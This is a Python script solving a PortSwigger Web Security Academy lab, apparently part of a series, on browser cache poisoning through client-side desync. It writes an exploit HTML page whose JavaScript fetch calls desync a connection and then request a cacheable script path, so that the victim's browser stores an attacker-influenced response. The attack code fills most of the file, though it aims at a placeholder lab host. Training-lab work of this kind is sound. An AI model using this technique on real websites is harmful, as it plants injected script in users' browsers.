"""
Lab 22: Browser cache poisoning via client-side desync
https://portswigger.net/web-security/request-smuggling/browser/client-side-desync/lab-browser-cache-poisoning-via-client-side-desync
Difficulty: Practitioner

📝 Same CSD vector as Lab 21, but the hijacked second response is for a
request to a path the BROWSER caches locally (not a shared server cache) —
e.g. a static asset path — so the corrupted/attacker-influenced response
gets poisoned into the VICTIM's own browser cache specifically, persisting
even after our exploit page is closed.
"""

from utils import log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
CACHEABLE_PATH = "/resources/js/analytics.js"  # confirm the real browser-cacheable path


def build_csd_cache_poc():
    return f"""<script>
async function go() {{
  // Step 1: desync, same shape as Lab 21.
  await fetch('{TARGET}/', {{
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    keepalive: true,
    headers: {{'Content-Type': 'text/plain'}},
    body: 'x=1',
  }});

  // Step 2: request the cacheable asset on the same (desynced) connection.
  // If the response gets corrupted to contain attacker-chosen JS, the
  // BROWSER's own HTTP cache stores that poisoned version for this path.
  await fetch('{TARGET}{CACHEABLE_PATH}', {{mode: 'no-cors', credentials: 'include'}});
}}
go();
</script>"""


def run():
    html = build_csd_cache_poc()
    out_path = "exploit.html"
    with open(out_path, "w") as f:
        f.write(html)
    log(f"Wrote PoC scaffold to {out_path}")

    note("As with Lab 21: the exact desync-triggering body/headers need")
    note("confirming against the live target first (Burp's desync testing")
    note("tools) — this script gives you the delivery shape, not a")
    note("pre-verified byte-for-byte payload.")
    note("After delivery, have the victim (or your own second browser")
    note(f"profile) load {CACHEABLE_PATH} normally — if it's served from")
    note("the now-poisoned browser cache, you'll see the injected content")
    note("without any further requests reaching the server at all.")


if __name__ == "__main__":
    run()
